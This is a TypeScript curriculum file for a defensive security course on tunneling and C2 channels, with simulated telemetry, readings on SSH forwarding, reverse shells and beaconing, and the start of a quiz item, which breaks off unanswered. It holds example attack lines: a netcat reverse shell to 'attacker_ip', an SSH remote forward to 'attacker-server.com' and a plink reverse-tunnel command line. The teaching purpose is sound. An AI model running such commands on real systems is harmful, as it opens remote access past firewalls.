/**
 * Learning Rooms — Batch 17 (Room 6)
 *
 * "Tunneling, Proxies & C2 Channels" (tunneling-c2-channels)
 *
 * Advanced deep dive into tunneling and covert channels: SSH local/remote/
 * dynamic port forwarding, SOCKS proxies, reverse shells, ICMP and DNS
 * tunneling mechanics, HTTP(S) beaconing math (interval + jitter), and
 * living-off-the-land tunneling tools (ngrok, Chisel, plink) with their
 * detection fields.
 */

import type { TelemetryEvent } from "@/lib/sim/types";

// ── Log analysis event 1: plink.exe reverse SSH tunnel process creation ─────
const plinkReverseTunnelEvent: TelemetryEvent = {
  id: "evt-tunnel-la1-001",
  ts: "2026-07-01T22:14:09.000Z",
  source: "sysmon",
  vendor: "Microsoft Sysmon",
  event_type: "process_create",
  severity: "high",
  hostname: "SRV-APP12.solvix.local",
  process: {
    name: "plink.exe",
    pid: 6120,
    path: "C:\\Users\\svc_report\\AppData\\Local\\Temp\\plink.exe",
    parent_name: "cmd.exe",
    parent_pid: 4488,
    cmdline: "plink.exe -ssh -N -R 3389:127.0.0.1:3389 -P 443 -l relay -pw ******** 45.83.219.11",
    user: "SOLVIX\\svc_report",
    integrity: "medium",
  },
  dst_ip: "45.83.219.11",
  dst_port: 443,
  protocol: "tcp",
  description:
    "SRV-APP12 spawned plink.exe, a signed PuTTY command-line SSH client not previously observed on this host, which established an outbound connection on TCP/443 and has remained connected for over four hours",
  raw: {
    "winlog.event_id": 1,
    "winlog.provider_name": "Microsoft-Windows-Sysmon",
    "winlog.event_data.Image": "C:\\Users\\svc_report\\AppData\\Local\\Temp\\plink.exe",
    "winlog.event_data.CommandLine":
      "plink.exe -ssh -N -R 3389:127.0.0.1:3389 -P 443 -l relay -pw ******** 45.83.219.11",
    "winlog.event_data.ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "winlog.event_data.ParentCommandLine": "cmd.exe /c plink.exe -ssh -N -R 3389:127.0.0.1:3389 -P 443 -l relay -pw ******** 45.83.219.11",
    "winlog.event_data.User": "SOLVIX\\svc_report",
    "winlog.event_data.IntegrityLevel": "Medium",
    "winlog.event_data.Hashes": "SHA256=9F1A2B3C4D5E6F708192A3B4C5D6E7F8091A2B3C4D5E6F708192A3B4C5D6E7F",
    "winlog.event_data.SignatureStatus": "Valid",
    "winlog.event_data.Signed": "true",
    "winlog.event_data.Company": "Simon Tatham",
    connection_duration_seconds_so_far: 15240,
    prior_occurrences_of_plink_on_host: 0,
  },
};

// ── Log analysis event 2: TLS beacon to ngrok-style tunneling infra ─────────
const ngrokBeaconEvent: TelemetryEvent = {
  id: "evt-tunnel-la2-001",
  ts: "2026-07-03T18:02:30.000Z",
  source: "proxy",
  vendor: "Zscaler Internet Access",
  event_type: "net_connection",
  severity: "high",
  hostname: "SRV-DB07.solvix.local",
  src_ip: "10.40.2.201",
  dst_ip: "3.15.44.88",
  dst_port: 443,
  protocol: "tcp",
  network: { domain: "8f2a9c1e.ngrok-free.app" },
  description:
    "SRV-DB07, a production database server, has established 58 TLS sessions to 8f2a9c1e.ngrok-free.app over the past 59 minutes",
  raw: {
    "tls.sni": "8f2a9c1e.ngrok-free.app",
    "destination.ip": "3.15.44.88",
    "destination.port": 443,
    "network.protocol": "https",
    connections_last_hour: 58,
    interval_seconds_avg: 61.2,
    interval_seconds_stddev: 6.8,
    bytes_out_avg_per_connection: 412,
    bytes_in_avg_per_connection: 388,
    process_hint: "sqlservr.exe",
    dst_asn_org: "AMAZON-02",
  },
};

const tunnelingRoom = {
  id: "tunneling-c2-channels",
  title: "Tunneling, Proxies & C2 Channels",
  description:
    "Learn to recognize covert channels the way an analyst investigating an active intrusion actually finds them: SSH local/remote/dynamic port forwarding and what each looks like on the wire, SOCKS proxy pivoting and reverse shells, ICMP and DNS tunneling mechanics, the exact math behind HTTP(S) beacon interval and jitter, and why attackers increasingly prefer legitimate, signed living-off-the-land tools like ngrok, Chisel, and plink over custom malware — plus how to tell dual-use tooling used maliciously apart from the same tools used for approved IT work.",
  difficulty: "advanced" as const,
  category: "Network Security" as const,
  estimatedMinutes: 70,
  xp: 650,
  icon: "🕳️",
  prerequisites: ["tcpip-deep-dive", "dns-deep-dive"],
  tasks: [
    // ── Reading 1: SSH port forwarding ────────────────────────────────────────
    {
      type: "reading" as const,
      id: "tunnel-r1",
      heading: "SSH Port Forwarding: Local, Remote, and Dynamic (SOCKS)",
      content:
        `SSH is not just a remote shell protocol — its connection can carry arbitrary additional TCP traffic through the same encrypted tunnel, using three distinct forwarding modes that every analyst needs to be able to recognize by their command-line syntax alone, because that syntax is exactly what shows up in process-creation telemetry.\n\n` +
        `**Local forwarding (-L): expose a REMOTE service on your LOCAL machine**\n\n` +
        `ssh -L 8080:internal-app:80 jumpbox.example.com opens a listener on YOUR local port 8080; anything you connect to on 127.0.0.1:8080 gets tunneled, through the SSH connection to jumpbox.example.com, and from there out to internal-app:80. This is the common, everyday, legitimate use case: reaching an internal service you don't have direct network access to, via an SSH jump host you do have access to. Attackers use it too — most often to reach an internal target from their own attacker-controlled machine, tunneling through a single compromised host that DOES have the needed network access.\n\n` +
        `**Remote forwarding (-R): expose a LOCAL service to the REMOTE side — the dangerous direction**\n\n` +
        `ssh -R 3389:127.0.0.1:3389 attacker-server.com does the reverse: it opens a listener on the REMOTE machine (attacker-server.com), and anything connecting to THAT remote listener gets tunneled back through the SSH connection to 127.0.0.1:3389 on the machine that initiated the SSH connection. This is exactly the mechanism behind a reverse tunnel: an internal, compromised host initiates a normal-looking OUTBOUND SSH connection (which most firewalls permit far more readily than inbound connections), and once established, the attacker — sitting on the remote end — can now reach back INTO the internal network through that tunnel, entirely bypassing whatever inbound firewall rules would otherwise have blocked them. The internal host effectively phones home and hands the attacker a door that opens from the outside, without ever requiring an inbound connection to be allowed anywhere.\n\n` +
        `**Dynamic forwarding (-D): turn the SSH client into a full SOCKS proxy**\n\n` +
        `ssh -D 1080 jumpbox.example.com doesn't forward one specific port at all — it turns the local machine into a SOCKS proxy listening on port 1080. Any application configured to use that SOCKS proxy (a browser, or, notably, an attacker's own tooling configured via proxychains) can now reach ANY destination reachable from jumpbox.example.com, on ANY port, all tunneled through the single encrypted SSH connection. This is the most flexible and most dangerous mode for an attacker pivoting through a compromised host: rather than pre-selecting one specific service to forward (as -L and -R require), -D gives them arbitrary, on-demand access to the entire network reachable from that pivot point.\n\n` +
        `**Why the network evidence looks almost identical regardless of forwarding mode**\n\n` +
        `From a pure flow-log perspective, all three modes look like exactly what they are at the transport layer: one long-lived, encrypted TCP connection on port 22 (or, as covered later in this room, sometimes a non-standard port chosen deliberately to blend in). The forwarding TYPE and DIRECTION are not visible in the flow record at all — this is exactly why process-creation telemetry (the actual command line used to invoke ssh or plink, which explicitly states -L, -R, or -D and the exact ports involved) is essential to fully understand what a suspicious long-lived SSH connection is actually being used for.`,
      codeExample:
        "SSH FORWARDING MODES -- SYNTAX AND DIRECTION\n" +
        "=======================================================\n" +
        "-L (local forward)\n" +
        "  ssh -L 8080:internal-app:80 jumpbox.example.com\n" +
        "  Local:8080 --tunnel--> jumpbox --> internal-app:80\n" +
        "  Use: reach a REMOTE service from HERE\n" +
        "\n" +
        "-R (remote forward) -- THE DANGEROUS DIRECTION\n" +
        "  ssh -R 3389:127.0.0.1:3389 attacker-server.com\n" +
        "  attacker-server:3389 --tunnel--> HERE:127.0.0.1:3389\n" +
        "  Use: expose a LOCAL service to a REMOTE listener --\n" +
        "  attacker reaches INTO your network via an outbound-\n" +
        "  initiated connection, bypassing inbound firewall rules\n" +
        "\n" +
        "-D (dynamic / SOCKS proxy)\n" +
        "  ssh -D 1080 jumpbox.example.com\n" +
        "  Turns local machine into a SOCKS proxy on port 1080 --\n" +
        "  ANY app/tool can now reach ANY destination reachable\n" +
        "  from jumpbox, over ANY port, through one SSH tunnel\n" +
        "=======================================================\n\n" +
        "WHAT THE FLOW LOG SHOWS REGARDLESS OF MODE\n" +
        "=======================================================\n" +
        "One long-lived, encrypted TCP connection on port 22 (or a\n" +
        "chosen alternate port). Forwarding TYPE and DIRECTION are\n" +
        "invisible at the flow layer -- process-creation telemetry\n" +
        "(the actual command line) is what reveals -L vs -R vs -D.\n" +
        "=======================================================",
    },

    // ── Reading 2: SOCKS proxies and reverse shells ───────────────────────────
    {
      type: "reading" as const,
      id: "tunnel-r2",
      heading: "SOCKS Proxies and Reverse Shells",
      content:
        `**SOCKS: a protocol-agnostic relay**\n\n` +
        `A SOCKS proxy (versions 4 and 5, with 5 adding authentication and UDP support) is deliberately simple: a client connects to the SOCKS proxy and requests "relay my traffic to destination X, port Y" — the proxy then relays raw TCP (or, in SOCKS5, UDP) bytes back and forth, with no understanding of or interest in what protocol is actually being carried inside. This protocol-agnosticism is exactly what makes SOCKS so useful for pivoting: once an attacker has a SOCKS proxy running through a compromised host (via SSH -D, as covered above, or via a dedicated proxy tool), they can point ANY of their own tooling — a port scanner, a web browser, an exploitation framework, credential-harvesting tools — at that SOCKS proxy and have it reach deep into the target's internal network as if the attacker's own machine were sitting inside it, without needing to write any custom malware to do so. Tools like proxychains transparently redirect an existing application's network traffic through a configured SOCKS proxy without that application needing any built-in proxy support at all.\n\n` +
        `**Chaining SOCKS proxies for multi-hop pivoting**\n\n` +
        `Attackers frequently chain multiple SOCKS hops together (compromise host A, pivot via A's SOCKS proxy to reach and compromise host B deeper in the network, establish a SECOND SOCKS proxy through B, and so on) — each additional hop makes the traffic's true origin progressively harder to trace purely from network logs at any single point, since each hop only ever sees its own immediate predecessor and successor, not the full chain.\n\n` +
        `**Bind shells vs. reverse shells**\n\n` +
        `A shell payload gives an attacker interactive command execution on a compromised host, and comes in two structural flavors. A **bind shell** has the compromised host itself open a listening port and wait for the attacker to connect INTO it — simple, but requires an INBOUND connection to reach the victim, which most modern firewalls (correctly configured to block unsolicited inbound traffic) will block outright, making bind shells largely impractical against any reasonably defended target. A **reverse shell** flips the direction: the compromised host itself initiates an OUTBOUND connection back to attacker-controlled infrastructure, which then hands back an interactive shell over that connection. Because outbound connections are, in most environments, permitted far more liberally than inbound ones (users need to browse the web, applications need to reach APIs), reverse shells are overwhelmingly the more common and more successful approach — this is the exact same "outbound is trusted more than inbound" asymmetry that makes SSH remote forwarding (-R) so effective, and it's the single most consistent theme across nearly every tunneling and pivoting technique in this room.\n\n` +
        `**What this looks like in a flow log**\n\n` +
        `A classic netcat-style reverse shell (nc -e /bin/bash attacker_ip 4444, or the fileless PowerShell/Python equivalents that avoid a literal -e flag but accomplish the same thing) produces a connection with a distinctive shape: NOT a clean, protocol-conforming HTTP/TLS/SSH negotiation at all if run in its simplest raw-netcat form, a genuinely interactive, irregular byte pattern over time (bursts corresponding to individual commands typed and their output, rather than either a clean request/response HTTP shape or a steady, high-volume bulk-transfer shape), and — often — a listener/connection on a port with no legitimate registered service association at all (4444 is the long-standing, extremely well-known default Metasploit listener port specifically because it was never claimed by any standard service). More sophisticated reverse shells deliberately wrap themselves in legitimate-looking HTTPS traffic specifically to blend in and avoid exactly this kind of raw-protocol fingerprinting — which is exactly why the beaconing-math and living-off-the-land-tooling readings later in this room matter as much as recognizing a raw, unencrypted reverse shell does.`,
      codeExample:
        "BIND SHELL vs REVERSE SHELL -- WHY REVERSE WINS\n" +
        "=======================================================\n" +
        "BIND SHELL\n" +
        "  Victim listens -> Attacker connects IN\n" +
        "  Requires an INBOUND connection to reach the victim --\n" +
        "  blocked by nearly any reasonably configured firewall\n" +
        "\n" +
        "REVERSE SHELL\n" +
        "  Victim connects OUT -> Attacker's listener receives it\n" +
        "  Requires only an OUTBOUND connection -- permitted far\n" +
        "  more liberally in almost every real environment\n" +
        "=======================================================\n\n" +
        "CLASSIC RAW NETCAT REVERSE SHELL\n" +
        "=======================================================\n" +
        "Victim runs:  nc -e /bin/bash attacker_ip 4444\n" +
        "  -> outbound TCP to attacker_ip:4444\n" +
        "  -> port 4444 has no standard registered service\n" +
        "     (the long-standing default Metasploit listener port)\n" +
        "  -> irregular, bursty byte pattern (interactive typing +\n" +
        "     command output), not a clean protocol negotiation\n" +
        "     or steady bulk-transfer shape\n" +
        "=======================================================\n\n" +
        "SOCKS PROXY CHAINING FOR MULTI-HOP PIVOTING\n" +
        "=======================================================\n" +
        "Attacker -> SOCKS via Host A -> Host B (new pivot) ->\n" +
        "  SOCKS via Host B -> Host C -> ...\n" +
        "  Each hop only sees its own immediate predecessor/\n" +
        "  successor -- true origin gets harder to trace at any\n" +
        "  single observation point as the chain grows\n" +
        "=======================================================",
    },

    // ── Reading 3: ICMP/DNS tunneling mechanics ────────────────────────────────
    {
      type: "reading" as const,
      id: "tunnel-r3",
      heading: "ICMP and DNS Tunneling Mechanics, Revisited for Throughput and Detection",
      content:
        `You've already covered DNS tunneling's statistical detection in depth in an earlier room; here the focus is the mechanics of ICMP tunneling specifically, paired with a throughput-focused recap of DNS tunneling's practical constraints — both matter because they represent the two most heavily "allowed by default" protocols an attacker can hide inside.\n\n` +
        `**ICMP tunneling: hiding data in a protocol built for control messages, not payload**\n\n` +
        `ICMP echo request/reply (what ping uses) technically permits an arbitrary-length, arbitrary-content data payload in each packet — normally, this payload is just fixed padding bytes (a standard Windows ping sends a recognizable, repeating 32-byte alphabetic pattern; a standard Linux/Unix ping sends a recognizable, incrementing 48- or 56-byte pattern) that no real application ever reads or cares about. ICMP tunneling tools (icmpsh, ptunnel, and similar) abuse exactly this unused capacity: they encode arbitrary command/response data — shell commands, file contents, C2 instructions — directly inside that payload field, using ICMP echo request/reply pairs as the transport, riding on a protocol that firewalls very commonly permit outbound by default for basic network diagnostics.\n\n` +
        `**Detecting ICMP tunneling**\n\n` +
        `The tells are almost entirely about the payload not matching what a real ping utility ever produces: payload SIZE that's unusually large (real diagnostic pings rarely exceed 64-128 bytes; tunneled data pushing payloads toward the practical maximum, or showing wildly inconsistent sizes packet to packet as different amounts of data get sent, is anomalous) or payload CONTENT that doesn't match either OS's standard fixed pattern at all (real ping payloads are boringly predictable and repetitive; tunneled data looks like arbitrary binary or text, changing meaningfully between packets rather than repeating). An unusually HIGH RATE of ICMP echo requests to a single external host — far beyond what any legitimate connectivity troubleshooting session would ever generate — is the other major signal, mirroring the volume-based logic from DNS tunneling detection.\n\n` +
        `**DNS tunneling: throughput constraints worth internalizing**\n\n` +
        `Beyond the statistical signals covered previously, it's worth understanding WHY DNS tunneling behaves the way it does: each individual DNS query/response round trip carries only a small amount of usable payload (tens of bytes to perhaps a couple hundred, depending on record type and encoding overhead), and each round trip has real latency (a full resolution can take anywhere from single-digit milliseconds to significantly longer depending on the path). This means DNS tunneling's realistic sustained throughput tops out at somewhere around tens of kilobytes per minute in typical conditions — genuinely usable for C2 command-and-control traffic (small commands, small responses) and slow, patient data exfiltration, but fundamentally impractical for moving large files quickly. This throughput ceiling is itself a useful piece of context: if you're investigating a suspected large, fast data exfiltration event, DNS tunneling is a poor mechanical fit for that specific characteristic, and the investigation should look elsewhere (a large upload-shaped TCP flow, or a fast HTTP(S) POST) — while a slow, patient, long-duration low-volume channel is exactly DNS tunneling's comfort zone.`,
      codeExample:
        "STANDARD PING PAYLOADS vs TUNNELED ICMP PAYLOADS\n" +
        "=======================================================\n" +
        "Windows ping default payload (32 bytes, repeating):\n" +
        "  abcdefghijklmnopqrstuvwabcdefghi\n" +
        "\n" +
        "Linux/Unix ping default payload (48-56 bytes, incrementing\n" +
        "  byte sequence 0x08, 0x09, 0x0a, 0x0b, ...)\n" +
        "\n" +
        "Tunneled ICMP payload:\n" +
        "  Variable size packet-to-packet, arbitrary binary/text\n" +
        "  content that changes meaningfully between packets --\n" +
        "  matches NEITHER OS's standard fixed pattern\n" +
        "=======================================================\n\n" +
        "ICMP TUNNELING DETECTION SIGNALS\n" +
        "=======================================================\n" +
        "[ ] Payload size unusually large or inconsistent packet-\n" +
        "    to-packet (real diagnostic pings: small and constant)\n" +
        "[ ] Payload content doesn't match either OS's fixed,\n" +
        "    repeating standard pattern\n" +
        "[ ] High rate of echo requests to one external host, far\n" +
        "    beyond normal troubleshooting volume\n" +
        "=======================================================\n\n" +
        "DNS TUNNELING THROUGHPUT REALITY CHECK\n" +
        "=======================================================\n" +
        "Per round trip:  tens to ~hundreds of usable payload bytes\n" +
        "Realistic sustained throughput: roughly tens of KB/minute\n" +
        "  -> fits: small C2 commands, slow patient exfiltration\n" +
        "  -> does NOT fit: large/fast file exfiltration (look for\n" +
        "     an upload-shaped TCP flow or fast HTTP(S) POST instead)\n" +
        "=======================================================",
    },

    // ── Reading 4: HTTP(S) beaconing math ──────────────────────────────────────
    {
      type: "reading" as const,
      id: "tunnel-r4",
      heading: "HTTP(S) Beaconing Math: Interval, Jitter, and Statistical Detection",
      content:
        `Command-and-control frameworks almost universally use a "sleep and check in" model rather than maintaining a constant, always-on connection — both to minimize their network footprint and to reduce the chance of looking like a persistent, actively-monitored session. Understanding the exact math behind this lets you detect it even when the operator has deliberately tried to hide the pattern.\n\n` +
        `**Interval: the base sleep time**\n\n` +
        `The beacon's operator configures a **sleep interval** (commonly measured in seconds) — how long the implant waits between each check-in to its C2 server. A naive, un-jittered beacon checking in every exactly 60 seconds produces a trivially detectable pattern: plot the time gaps between successive connections to the same destination, and every single gap is (as close to) precisely 60 seconds as network latency allows.\n\n` +
        `**Jitter: randomizing within a band, not eliminating the pattern**\n\n` +
        `**Jitter** is configured as a percentage that randomizes the actual sleep time around the base interval — a 60-second interval with 20% jitter means each individual sleep is randomly chosen somewhere between 48 seconds (60 minus 20%) and 72 seconds (60 plus 20%), a different random value each time. This defeats naive "are all the gaps EXACTLY 60 seconds" detection — but it does NOT make the beacon's timing look like genuinely random human activity, because jitter only randomizes WITHIN a fixed, bounded band. Every single gap, no matter how the random draw comes out, still falls somewhere between 48 and 72 seconds — it can never be 10 seconds, and it can never be 300 seconds, the way genuinely unstructured human browsing behavior naturally would produce.\n\n` +
        `**The statistical detection: deltas cluster in a band, real activity doesn't**\n\n` +
        `An analyst (or an automated tool like RITA, built specifically for this) computes the **inter-arrival deltas** — the time gap between each successive connection from one host to the same destination — across a large enough sample, then looks at the SHAPE of that distribution. A beacon with interval=60/jitter=20% produces deltas that are tightly and evenly clustered somewhere in the 48-72 second band, session after session, hour after hour, essentially indefinitely, for as long as the implant stays alive. Ordinary human-driven traffic to any single destination — even a site someone visits very habitually — does not produce this kind of persistent, bounded clustering; human timing is influenced by actual activity, breaks, meetings, and simple inattention, producing deltas that are far more varied and don't sit in one tight, unchanging band indefinitely.\n\n` +
        `**Worked example**\n\n` +
        `Given ten observed connection timestamps to one destination, compute the nine gaps between them. If every one of those nine gaps falls between 48 and 72 seconds, with no gap dramatically outside that range, and this pattern continues consistently across a much longer observation window (hours, not just ten samples), that is a very high-confidence beacon signature — because the ONLY realistic non-malicious explanation for that kind of sustained, bounded regularity is some form of legitimate, genuinely scheduled automated task (an update checker, a telemetry client, a license-validation service) — which is exactly why destination reputation and process attribution (covered in the TLS room's C2 detection reading) still matter as the final piece of the puzzle even after the timing math checks out.\n\n` +
        `**Beacon "score" as a concept**\n\n` +
        `Detection tools formalize this into a beacon score: a composite metric weighing how tightly deltas cluster (low variance relative to the mean = higher score), how many repetitions have been observed (more repetitions = more statistical confidence), and how consistent the data-size-per-connection is (as covered in the TLS room). A single pair of connections 60 seconds apart proves nothing; dozens of connections sustaining a tight, bounded interval over hours is what turns a coincidence into a confident detection.`,
      codeExample:
        "WORKED EXAMPLE: interval=60s, jitter=20% -> band = 48-72s\n" +
        "=======================================================\n" +
        "Ten observed connection timestamps (seconds elapsed):\n" +
        "  0, 63, 119, 184, 231, 296, 349, 411, 462, 527\n" +
        "\n" +
        "Nine deltas between them:\n" +
        "  63, 56, 65, 47, 65, 53, 62, 51, 65\n" +
        "\n" +
        "Check against the 48-72s expected band:\n" +
        "  63 OK   56 OK   65 OK   47 *just under*   65 OK\n" +
        "  53 OK   62 OK   51 OK   65 OK\n" +
        "\n" +
        "  8 of 9 deltas land cleanly inside the band; the one\n" +
        "  borderline value (47) is consistent with network jitter\n" +
        "  ON TOP of the beacon's own configured jitter. This tight\n" +
        "  clustering, sustained over many samples, is the beacon\n" +
        "  signature -- genuine human browsing would NOT produce\n" +
        "  nine deltas this consistently bounded.\n" +
        "=======================================================\n\n" +
        "BEACON SCORE -- WHAT FEEDS INTO IT\n" +
        "=======================================================\n" +
        "[+] Low variance of deltas relative to the mean interval\n" +
        "[+] High repetition count (more samples = more confidence)\n" +
        "[+] Consistent bytes-per-connection (from the TLS room)\n" +
        "[+] Rare/first-seen or low-reputation destination\n" +
        "One or two matching connections: coincidence.\n" +
        "Dozens, sustained over hours: high-confidence beacon.\n" +
        "=======================================================",
    },

    // ── Reading 5: LOLBin tunneling tools ────────────────────────────────────
    {
      type: "reading" as const,
      id: "tunnel-r5",
      heading: "Living-off-the-Land Tunneling Tools: ngrok, Chisel, and plink",
      content:
        `Attackers increasingly favor legitimate, often digitally-signed, publicly-available tools over custom-built malware for exactly one reason: signature-based antivirus and simplistic allowlisting are far less likely to flag a well-known, legitimately-signed utility, and even when analysts do notice the tool running, its presence alone is genuinely ambiguous — plenty of legitimate IT and developer workflows use these same tools.\n\n` +
        `**ngrok: instant public tunnels via a trusted SaaS provider**\n\n` +
        `ngrok is a legitimate, widely-used developer tool that creates a public, internet-reachable HTTPS (or TCP) tunnel to a service running on a local/internal machine, entirely through ngrok's own cloud infrastructure — no port forwarding, no firewall changes, no public IP needed on the target's end at all. An attacker who has landed on an internal host can run the ngrok client to instantly expose an internal service (a web shell, an RDP session via a local proxy, a file share) to the public internet, or, in the other direction, establish an outbound tunnel back to infrastructure they control, entirely through what LOOKS like completely normal, legitimate SaaS traffic. The network fingerprint is distinctive once you know to look for it: TLS connections with an SNI matching ngrok's own domains (*.ngrok.io, *.ngrok-free.app, or a custom domain if the attacker has a paid ngrok plan), from a host that has no legitimate business reason to be reaching a consumer/developer tunneling SaaS product at all (a production database server, a domain controller, a finance file server) is a strong contextual anomaly, even though the traffic itself is genuinely encrypted, genuinely legitimate SaaS traffic from ngrok's own perspective.\n\n` +
        `**Chisel: a fast, Go-based TCP/UDP tunnel, often for SOCKS pivoting**\n\n` +
        `Chisel is an open-source tool (also legitimately used by penetration testers and some IT teams) that creates a tunnel over HTTP, with the server and client both compiled as small, portable, single-file binaries — making it trivially easy to drop onto a compromised host with no installation and no dependencies. Chisel is very commonly paired specifically with SOCKS proxy functionality, letting an attacker stand up a full network pivot through a single dropped binary rather than needing SSH access (which requires valid credentials and an SSH server already running) at all. Its network fingerprint rides on HTTP/HTTPS, and while its default configuration has some recognizable characteristics (a specific banner/handshake behavior at the start of a session), operators increasingly customize these specifically to evade signature-based detection — which is exactly why behavioral signals (an unfamiliar, recently-dropped binary establishing a long-lived outbound connection with beacon-like or pivot-like traffic shape) matter more than static signatures for this tool specifically.\n\n` +
        `**plink.exe: PuTTY's command-line SSH client, and why EDR often trusts it by default**\n\n` +
        `plink (PuTTY Link) is the command-line-only counterpart to the PuTTY SSH client — a small, digitally-signed, entirely legitimate Windows binary that system administrators have used for decades to script SSH connections and port forwards without needing an interactive terminal. Because it's so old, so widely deployed for entirely legitimate administrative scripting, and properly code-signed, many EDR/allowlisting policies either explicitly trust it or simply never flag it by default — which is precisely why attackers favor it specifically for scripting exactly the -L/-R/-D forwarding techniques from Reading 1 on Windows hosts, where a native SSH client historically wasn't always present. Seeing plink.exe launched from an unusual location (a temp directory rather than a standard admin toolkit path, as in this room's log analysis exercise), by an account or in a context with no history of using it, is the key behavioral differentiator — not the mere fact that plink.exe exists or ran at all.\n\n` +
        `**The common thread**\n\n` +
        `All three tools share the same appeal: legitimate, often signed, widely available, and genuinely dual-use — which means detection has to rely on CONTEXT (is this host/account/location one that has any business reason to run this tool at all), BEHAVIOR (connection duration, destination, traffic shape), and CORRELATION (does this coincide with other suspicious activity), rather than simply alerting on the tool's mere presence, which would produce constant false positives against legitimate administrative and developer use.`,
      codeExample:
        "LOLBIN TUNNELING TOOL -> LEGITIMATE USE -> ABUSE PATTERN\n" +
        "=======================================================\n" +
        "TOOL     LEGITIMATE USE          ABUSE PATTERN\n" +
        "-------------------------------------------------------\n" +
        "ngrok    Developers exposing a   Exfil/C2 tunnel via a\n" +
        "         local dev server for    trusted SaaS provider;\n" +
        "         demos/webhooks          SNI = *.ngrok.io /\n" +
        "                                 *.ngrok-free.app\n" +
        "\n" +
        "Chisel   Pentesters/some IT      Dropped single-file\n" +
        "         teams for authorized    binary, SOCKS pivot\n" +
        "         tunneling               over HTTP/HTTPS, no\n" +
        "                                 installation needed\n" +
        "\n" +
        "plink.exe Sysadmin SSH/port-     Scripted -L/-R/-D\n" +
        "         forward scripting,      forwarding on Windows,\n" +
        "         signed & often          often trusted by EDR/\n" +
        "         EDR-allowlisted         allowlisting by default\n" +
        "=======================================================\n\n" +
        "THE KEY DETECTION QUESTIONS FOR ANY DUAL-USE TOOL\n" +
        "=======================================================\n" +
        "1. Does this HOST/ACCOUNT have any business reason to\n" +
        "   run this tool at all?\n" +
        "2. Is the LOCATION it ran from normal (admin toolkit\n" +
        "   path) or anomalous (Temp, Downloads, user profile)?\n" +
        "3. Does the resulting CONNECTION behave normally (short,\n" +
        "   expected) or abnormally (long-lived, beacon-shaped,\n" +
        "   to an unexpected destination)?\n" +
        "=======================================================",
    },

    // ── Reading 6: investigation playbook ────────────────────────────────────
    {
      type: "reading" as const,
      id: "tunnel-r6",
      heading: "Putting It Together: A Tunneling Investigation Playbook",
      content:
        `Every technique in this room produces overlapping but distinguishable evidence across process, network, DNS, and TLS telemetry — this final reading is the checklist that ties them together into a repeatable investigation sequence.\n\n` +
        `**Step 1 — Process ancestry and command line**\n\n` +
        `Start at the endpoint if you have process telemetry available: what launched this connection, and what's the FULL command line? A bare "ssh" or "plink.exe" launch tells you little; the same launch WITH -R 3389:127.0.0.1:3389 visible in the command line tells you exactly what direction and what service is being forwarded, immediately. This single step is often the fastest way to fully understand what a suspicious long-lived connection actually is, and it's information that simply doesn't exist in network-only telemetry at all.\n\n` +
        `**Step 2 — Destination reputation and rarity**\n\n` +
        `Has this destination (IP, domain, or ASN) ever been contacted by any host on your network before? By how many hosts, and how often? A destination that's brand new to your entire environment, contacted by exactly one host, is a very different starting point than a destination your organization has used routinely for months.\n\n` +
        `**Step 3 — Connection duration and byte pattern**\n\n` +
        `Is this a short, transactional connection (consistent with a normal request/response) or an unusually long-lived one (consistent with an interactive tunnel or pivot session kept open for hours)? Is the byte pattern symmetric/bursty (interactive shell activity) or beacon-shaped (small, consistent, regularly repeating)?\n\n` +
        `**Step 4 — DNS and TLS metadata**\n\n` +
        `If the connection is HTTPS, what does the SNI reveal (a known tunneling-SaaS domain like *.ngrok.io, an unfamiliar/self-signed-certificate destination)? What's the JA3/JA3S? Were there DNS queries immediately preceding this connection that themselves showed tunneling-statistical anomalies (high entropy, TXT-heavy, high query rate) — sometimes the C2 channel itself IS the DNS traffic, rather than a separate follow-on TCP/TLS connection.\n\n` +
        `**Step 5 — Correlate with everything else happening on that host and account**\n\n` +
        `Does this coincide with other suspicious activity — a recent phishing click, an unusual authentication event, a process that shouldn't be there, files recently dropped into an unusual directory (like Temp, as seen with plink.exe in this room's log analysis)? A single, isolated finding is weaker evidence than the same finding appearing alongside two or three other unrelated-looking anomalies on the same host in the same time window.\n\n` +
        `**Step 6 — Check for a legitimate explanation BEFORE escalating: the it_verify_result principle**\n\n` +
        `Given how genuinely dual-use every technique and tool in this room is — legitimate SSH tunneling for IT support, legitimate ngrok use by developers, legitimate Chisel use by an approved penetration test, legitimate plink.exe scripting by sysadmins — the final, essential step before treating any of these findings as confirmed malicious is checking for a documented, verifiable business explanation: an open change ticket, a known approved tool deployment, confirmation from the account owner or their manager, or a scheduled penetration test's rules of engagement. This mirrors exactly the it_verify_result concept used throughout this curriculum: "confirmed" means a legitimate explanation exists and this is very likely a false positive; "unverified" (or no ticket found at all) means the finding should be escalated and investigated as a real possibility, not dismissed. Skipping this step in either direction — either escalating every instance of a dual-use tool reflexively, or dismissing every instance because "that tool is sometimes used legitimately" — is exactly the failure mode this entire room has been building you toward avoiding.`,
      codeExample:
        "THE SIX-STEP TUNNELING INVESTIGATION SEQUENCE\n" +
        "=======================================================\n" +
        "1. Process ancestry + full command line (if available)\n" +
        "   -- reveals -L/-R/-D, the tool, and its exact args\n" +
        "2. Destination reputation + rarity\n" +
        "   -- first-seen? by how many hosts, how often?\n" +
        "3. Connection duration + byte pattern\n" +
        "   -- short/transactional, long-lived interactive, or\n" +
        "      beacon-shaped (small, consistent, repeating)?\n" +
        "4. DNS + TLS metadata\n" +
        "   -- SNI, JA3/JA3S, preceding DNS anomalies\n" +
        "5. Correlate with other activity on the same host/account\n" +
        "   -- phishing click, odd auth event, dropped file, etc.\n" +
        "6. Check for a documented, legitimate explanation\n" +
        "   -- it_verify_result: confirmed -> likely FP\n" +
        "   -- it_verify_result: unverified/none found -> escalate\n" +
        "=======================================================",
    },

    // ── Question 1 ────────────────────────────────────────────────────────
    {
      type: "question" as const,
      id: "tunnel-q1",
      question:
        "An internal server initiates an outbound SSH connection to an external host using the -R flag with arguments forwarding its own local port 3389. What does this specific flag and direction indicate, and why is it considered more dangerous than a -L forward?",
      options: [
        "-R simply reverses the text direction of the terminal session and has no security implication",
        "-R (remote forwarding) exposes a LOCAL service on the internal server to a listener on the REMOTE (external) side — meaning the external party can now reach back INTO the internal network through the tunnel, using only an outbound connection the internal server itself initiated, entirely bypassing inbound firewall restrictions",
        "-R can only be used to forward DNS traffic, making it irrelevant to RDP-related services",
        "-R and -L are functionally identical; the flag choice is purely stylistic",
      ],
      answer: 1,
      explanation:
